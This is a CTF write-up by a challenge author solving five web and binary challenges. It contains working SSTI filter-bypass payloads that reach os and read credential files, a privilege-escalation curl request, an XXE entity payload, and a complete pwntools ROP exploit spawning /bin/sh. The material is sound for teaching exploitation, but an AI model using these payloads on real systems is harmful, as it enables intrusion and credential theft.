
# Cyber-breaker CTF (Attack Session) Solver Scripts & Documentation

CBC Final Round - Binary & Web Exploitation Writeup

## Introduction

1. [**Bl1tz** (Padding Oracle Attack + SSTI + LFI)](#web-exploitation)
2. [**E-Market** (XXE Injection on Excel File)](#e-market-hard)
3. [**Bl1zzard** (Web Reversing Logic)](#bl1zzard-easy)
4. [**Starting Point** (Return-oriented Programming)](#binary-exploitation)
5. [**Ncurse** (Binary Exploitation)](#ncurse-easy)

## Web Exploitation

### Bl1tz (Hard)

#### Overview

Bl1tz is an e-commerce website which has 2 user roles: public unauthenticated users with less capabilities, and admin users with access to a management dashboard. The challenge description provides a hint by mentioning that "a hacker successfully logged in as an Admin" which guides us toward the goal of accessing admin functionality to get the flag. But actually it's not that easy because the current role we have now is just a public user (unauthenticated) with less capabilities. We need a way to login as admin.

There are several user input in Bl1tz web target such as search bar, upload file, and customer chat bot. While the search bar reflects user input, it already has secure implementation by removing any malicious pattern given by the user. So we dont need to care about the Search bar. We need another injection point that reflects or stores user input.

The upload file functionality is likely vulnerable to some kind of bug because it will store our given payload to the server. But for now, since we dont know where the uploaded file is stored, it's useless. So the last thing that reflects user input is the customer chat bot. When users report issues through the chat interface, their input is directly embedded into a Jinja2 template without proper sanitization. This will cause any template syntax within the user's message to be executed as code rather than treated as plain text.But there are several blocked characters implemented by the app, and we need to avoid them:

```py
blocked_chars = ['__import__', 'exec', 'eval', 'subprocess', 'system', 'popen', 'chr', 'os', '__globals__', '__builtins__', 'read', 'listdir', '/', '..']
```

#### Solutions

To exploit the Server-side Template Injection, you must first bypass the implemented blacklist. Navigate to the chat interface, select the "Report Issue" option, and craft payloads that use string concatenation to bypass filters. Here is my payload for initial reconnaissance to explore directory content lists.
```py
{{ cycler.__init__.__getattribute__('__glob'+'als__')['__buil'+'tins__']['__imp'+'ort__']('o'+'s')['list'+'dir']('.') }}
```
This payload imports the OS module by accessing Python's built-in functions through Jinja2's context objects. When we explore all files and directories, there is a flag stored at `/flag.txt` path, but we can't open/read it because it has root permission. So instead of trying to retrieve the flag, our goal is to open `setup.sql` file which contains admin credentials that can be used to login as admin.

```py
{{ joiner.__init__.__getattribute__('__glob'+'als__')['__buil'+'tins__']['op'+'en']('src'+'\u002f'+'setup.sql','r').readlines() }}
```

After we discovered the admin credentials, we can login as admin to find another vulnerability in order to get the flag. From our previous exploration, we know that the file upload functionality on the Contact page is likely vulnerable because it will store our given file to the server. Now since we have an Admin privilege, we can know where the uploaded file will be stored. We can test this by uploading any file just to try to see the app behavior.

When we upload a file named sample.pdf, it can be accessed by the admin via /view?id={random_value} where the `random_value` is our uploaded file name. Actually it's not so random because if we upload the same file name, it will also generates the same `random_value`. Moreover, if we pass any value by ourselves, it will return an error says Invalid ciphertext block size which indicates Padding Oracle Vulnerability. From this, we could expect that each file name might be encrypted by some algorithm that generates this `random_value`.

Now since we found the Server-side Template Injection (SSTI) finding from our previous steps, we can use it to discover all the web target file and its source code to try to find something interesting related to how this app generates the `random_value`. After the discovery, there is a file called `./src/utils/crypto.py` which encrypts every user-uploaded file in the contact form.

This encryption algorithm works by using AES in CBC (Cipher Block Chaining) mode with PKCS#7 padding. When a plaintext is given, it is first converted into bytes and padded to fit AES’s block size. Then, a random initialization vector (IV) is generated to ensure that even identical plaintexts produce different ciphertexts. The plaintext is encrypted using the AES key and IV, and the IV is prepended to the ciphertext. Finally, the result is encoded in a modified base64 format.

Now we need to reverse the encryption process by making a final solver script to decrypt them. For decryption, the process reverses these steps. The encoded ciphertext is first normalized back into standard base64 and decoded into bytes. The IV is extracted from the beginning, and the remaining part is the ciphertext. Using the same key and IV, the ciphertext is decrypted, producing padded plaintext. The padding is then removed to recover the original message. If any error occurs, such as incorrect padding or invalid block size, the algorithm raises an error to signal corruption or tampering in the ciphertext.

Now copy the value of the previous random file name when we uploaded the sample_pdf file, and then decrypt it using the script above. You'll see that the decrypted result is actually the filename and its path. The next step is most likely about Local File Inclusion (LFI) vulnerability. And because we already know that the flag is stored on `/flag.txt` from our SSTI finding, we can just encrypt the text "/flag.txt", and pass it as the parameter value on `/view?id={encrypted_flag_path}` to get the flag.

### E-Market (Hard)

In the next challenge, we are given an E-Commerce website which has Products and News posts. Unlike the previous challenge, we can register a new account there even though it doesnt have wide capabilities because it just a normal user role. The challenge was intended to be a Black Box Testing format and that's why the difficulty is set to hard. Almost all participants found it difficult to find the first bug. But when the first hint came down, the rest of the steps is quite easy to solve. So, after ±3 hours of attack session, me as the challenge author decided to drop a hint to the participants. The hint is telling the participants that the web target has 2 user roles. Just it, no more or less. From this, i assume the participants would know that their next steps would be about Privilege Escalation to an Admin to get wider capabilities.

Assuming that we have given a hint where there are 2 role in the web target, our next step is clear that we should escalate our privilege to an Admin. There are multiple injection points to try in order to check whether some functionality could escalates our privilege or not. The first one is in the Login page, the second is in the Register page, and the last one is on the Profile page. You'll need to do some trial and error of those component. After that you would know that the profile page is vulnerable to Mass Assignment vulnerability, especially in the update endpoint which can escalates our privilege to Admin level.

#### Solutions

When users update their account profile information, there is a POST request to an API endpoint which contains parameter or data provided by them. The vulnerable part of the app is the backend allowing the users to modify some value in the form that is intended to be immutable field (can't be editable). We can see these behaviour by modifying immutable field such as username, using HTTP Request or cUrl. You'll see that the app still accepting our request even if the field is immutable

By using this finding, we can upgrade our privilege from User to Admin just by sending a cUrl request, and add role parameter in its request. After that, pass the admin as the value of that parameter. Here is the payload.

```bash
curl -X POST "https://e-market.serv2.cbd2025.cloud/profile.php" \
  -H "Cookie: PHPSESSID=UPDATE_ME" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "update=1&email=Wzrd@bl1tz.com&full_name=Wzrd&address=123 Test St&phone=555-0123&role=admin"
```

Now we've successfully manipulate our role to become an Admin, so what's next? Looking at the admin capabilities, this role can manage & create Products, News, and user' Orders. There are 2 type of user input in those menus: Input Form and File Upload component. In short, when you try to inject malicious payload in the input form, nothing happened. The input form has securely storing our input as a plain text rather than rendering it as a code. The file picker component on the Import Data feature is most likely vulnerable.

First of all, if you analyze the behaviour, this file upload functionality is only allows XLSX file because this component is used to input Products or News in massive amount of datas so the user doesnt have much effort to input them one by one. Second, we should match the intended row and column structure as provided on the web target, or else your Excel file wont be accepted by the app. Lastly, we can't manipulate the file extensions, content type, or even magic bytes in this component, so it's likely secure against RCE and File Upload Injection.

The next closest vulnerability that might occurs in an XLSX file upload feature is XML External Entity (XXE) Injection. XML (eXtensible Markup Language) is a format for structured data that uses tags, attributes, and a document structure, just like HTML. It let you define reusable pieces of text (entities) and specify document rules. Many XML parsers also let entities point to external resources (local files or URLs) so documents can include content from outside the file. And that is where our injection point lies.

XXE Injection happens when an attacker supplies XML to an application and the XML parser is allowed to resolve external entities. The attacker includes a payload that defines an external entity pointing to a sensitive resource (for example `<!ENTITY xxe SYSTEM "file:///etc/passwd">`). When the parser processes the XML, it fetches that external content into the document. If the application returns the parsed content to the attacker, that attacker can read local files, query internal services, or in our case, the flag.

But how can we craft a payload to inject external entities in the .xlsx file to get the flag? Short answer: an .xlsx is just a ZIP archive full of XML files. We can create a malicious .xlsx where one of the XML parts contains a `<!DOCTYPE>` with an external entity declaration (e.g. pointing at `file:///etc/flag.txt`) and then references that entity inside the XML. For example: In Windows, when we open an .xlsx file, it will automatically opened with Ms. Excel app. But in Linux, we can actually open .xlsx file using a ZIP viewer/opener. And that's the starting point of making our XXE injection payload.

Here is the flow: Make a proper row and column format based on the provided structure in the web target, and save it as .xlsx. Then extract the .xlsx file using ZIP viewer or just execute unzip payload.xlsx on your terminal. You'll see sharedStrings.xml inside the xl folder. After that, inject `<!ENTITY xxe SYSTEM "file:///flag.txt">` under the `<!DOCTYPE root>` section. The payload example would look like the image above. Finally, zip those files & folder generated by the previous unzip command by executing:

```bash
zip -r payload.xlsx '[Content_Types].xml' _rels/ xl/
```
Upload the xlsx payload on the web target and you'll get the flag.

## Binary Exploitation

### Starting Point (Medium)

#### Overview

Moving to the next challenge, we are given a Linux ELF 64-bit LSB binary executable. The challenge is about buffer overflow and ROP (return-oriented programming) in a CLI-based note manager app. The binary shows a simple menu that lets you create, view, list, and read admin notes. The notes themselves are stored in a fixed writable data area. The program will accepts user input for titles and contents, and there is also a separate Admin menu protected by a password. Based on the binary security of this challenge, the NX is enabled (so injected shellcode is not usable), the binary is not PIE (code and function addresses are fixed), and there is no stack canary in the vulnerable input path (so saved return address is overwritable).

In this case, because our code and gadgets stored at predictable addresses and NX prevents code execution on the stack, we can craft a ROP chain to pivot execution to the desired syscall sequence. Since the app binary is not PIE and there is no stack canary, our input can overwrite the saved return address and redirect execution to gadgets inside the binary. In other words, our goal is to either spawn a shell via ret2libc or making a system call (syscall) using C function such as execve. You can refer to the following link for the basic explanation of Buffer Overflow vulnerability.

The most robust exploitation for this challenge is to write the string /bin/sh\x00 into the writable notes area using the Create functionality and then builds a ROP chain that sets registers for an execve function and triggers syscall. The ret2libc approach would also worked as some participants tried it and successfully got the flag using this method. But ret2libc depends on leaking the address of puts and selecting the correct libc binary for the target because remote environments may use different libc versions. The syscall approach avoids those barrier by using gadgets/functions which present in the binary. Since the binary is not PIE and the notes array address is fixed, we get deterministic exploitation.

#### Solutions

The vulnerable part of the challenge is in the Admin function. The Admin routine reads user input into a local stack buffer allocated for the password while the buffer is only 0x10 (16) bytes long. It will accepts far more input from the user which will cause the data after those 16 bytes to overwrite return address. Once the function returns, the execution will jump to our controlled value to spawn a shell and get the flag. For example, there is path function in the binary that will open the flag locally. In the following image, we manipulate the return address to points to a function that stores the local flag. To understand how does Buffer Overflow works, you can see the image below.

But instead of writing to the path function address, our goal is to open the flag on the server using execve syscall. With the same logic as the previous example, write /bin/sh\x00 string into a note Title and Content. This ensures /bin/sh is present somewhere in writable memory we control. Second, Select the Admin menu option which prompts for a password and then fill it with the offset. Since the function saves the base pointer (8 bytes) above password buffer, overwriting the saved return pointer requires 16 + 8 = 24 bytes of filler, and that is our offset.

The rest of the step is about crafting our ROP chain exploit. We need to enumerate gadgets/functions inside the binary that is useful for calling the syscall. You can use ropper, ropgadget, or objdump to do this. For example, The following function addresses can be useful for our exploit.

```py
objdump -d chall | egrep -n "pop_rdi|pop_rax|pop_rsi|pop_rdx|syscall"
275:0000000000401359 pop_rdi:
279:000000000040135b pop_rsi:
283:000000000040135d pop_rdx:
287:000000000040135f pop_rax:
291:0000000000401361 pop_rdx_rbx:
296:0000000000401364 syscall_gadget:
```

The payload begins by overflowing the stack frame up to the saved return address with 24 offset as we calculate earlier. From this, we can control the return address of the program immediately after the stack padding. The next entry is p64(pop_rax) which is a function address that pop values from the stack into registers and return.

```py
payload = flat([
    b'A' * 24,
    p64(pop_rax),
    p64(0x59),
    p64(pop_rdi),
    p64(notes_addr),
    p64(pop_rsi),
    p64(0x0),
    p64(pop_rdx),
    p64(0x0),
    p64(syscall),
])
```

After that, we need to set the rax register to 59 which is the syscall number for execve in Linux x86_64 architecture. Dont forget to set rdi to point at the /bin/sh string that was previously written into the program, by using p64(pop_rdi); p64(notes_addr). By writing this, it means that we set /bin/sh as the first argument to execve function. The rest of the ROP chain is just to fill execve arguments. You can refer to this link for more information about the execve system call.

```py
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
elf = ELF('./chall')
p = process('./chall')
notes_addr = elf.symbols['notes']

offset = 24
pop_rax = 0x40135f
pop_rdi = 0x401359
pop_rsi = 0x40135b
pop_rdx = 0x40135d
syscall = 0x401364

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Title: ', b'/bin/sh\x00')
p.sendlineafter(b'Content: ', b'/bin/sh\x00')

p.sendlineafter(b'> ', b'4')
payload = flat([
    b'A' * offset,
    p64(pop_rax),
    p64(59),
    p64(pop_rdi),
    p64(notes_addr),
    p64(pop_rsi),
    p64(0),
    p64(pop_rdx),
    p64(0),
    p64(syscall),
])
p.sendlineafter(b'Password: ', payload)

p.interactive()
```

### Ncurse (Easy)

#### Overview

In the next PWN challenge, we are presented with a small x86-64 ELF that implements a text-based (ncurses-like) menu. The program offers a few interactive options such as creating an entry for username, and reads user-supplied text into a fixed-size buffer on the stack. But, the program input does not properly enforce the buffer's boundary, so supplying more bytes than the buffer can hold, could overwrites adjacent stack data. In this challenge the overflow doesn't need to smash saved return addresses or build complex ROP chains. Instead, it corrupts a nearby authorization flag or byte checks stored on the stack. That makes the vulnerability is straightforward and so easy once the correct offset is known.

#### Solution

The "Enter your name" menu option reads user-controlled bytes into a stack buffer of fixed length, but the input routine does not enforce an upper bound. Because an authorization byte is laid out after that buffer in stack memory, writing past the buffer's end allows a one-byte overwrite of this flag. The solver's payload (b'A'*68 + b'\xff') demonstrates the 68 offset bytes which will fill the buffer, and the \xff byte is used to pass the byte checks in the admin function.


